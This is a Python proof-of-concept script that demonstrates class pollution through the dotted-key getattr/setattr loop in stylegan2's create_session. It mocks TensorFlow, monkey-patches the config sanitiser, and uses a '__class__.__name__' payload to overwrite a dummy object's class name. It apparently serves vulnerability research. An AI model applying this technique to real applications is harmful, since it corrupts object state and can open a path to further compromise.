# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: create_session
# Type: get-attr-set-attr

# stylegan2's create_session in dnnlib/tflib/tfutil.py performs:
#   for key, value in cfg.items():
#     fields = key.split(".")
#     obj = config_proto
#     for field in fields[:-1]:
#       obj = getattr(obj, field)
#     setattr(obj, fields[-1], value)
#
# We import the function with a TF mock to demonstrate the vulnerability.

import sys
import types

# Mock tensorflow so dnnlib.tflib.tfutil can be imported
tf_mock = types.ModuleType('tensorflow')
tf_mock.contrib = types.ModuleType('tensorflow.contrib')
class MockConfigProto:
  pass
tf_mock.ConfigProto = MockConfigProto
class MockSession:
  def __init__(self, **kwargs): pass
tf_mock.Session = MockSession
sys.modules['tensorflow'] = tf_mock
sys.modules['tensorflow.contrib'] = tf_mock.contrib

from dnnlib.tflib.tfutil import create_session

class Target: pass
target = Target()

payload_value = "pwnd"
# create_session passes config_dict through _sanitize_tf_config which merges defaults,
# but user-supplied keys override. The traversal only skips keys starting with "rnd" or "env".
PAYLOAD = {"__class__.__name__": payload_value}

def run_poc():
  # Monkey-patch _sanitize_tf_config to return our payload directly
  import dnnlib.tflib.tfutil as tfutil
  tfutil._sanitize_tf_config = lambda config_dict: config_dict if config_dict else {}
  # Monkey-patch tf.ConfigProto to return our target
  tf_mock.ConfigProto = lambda: target
  create_session(config_dict=PAYLOAD)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
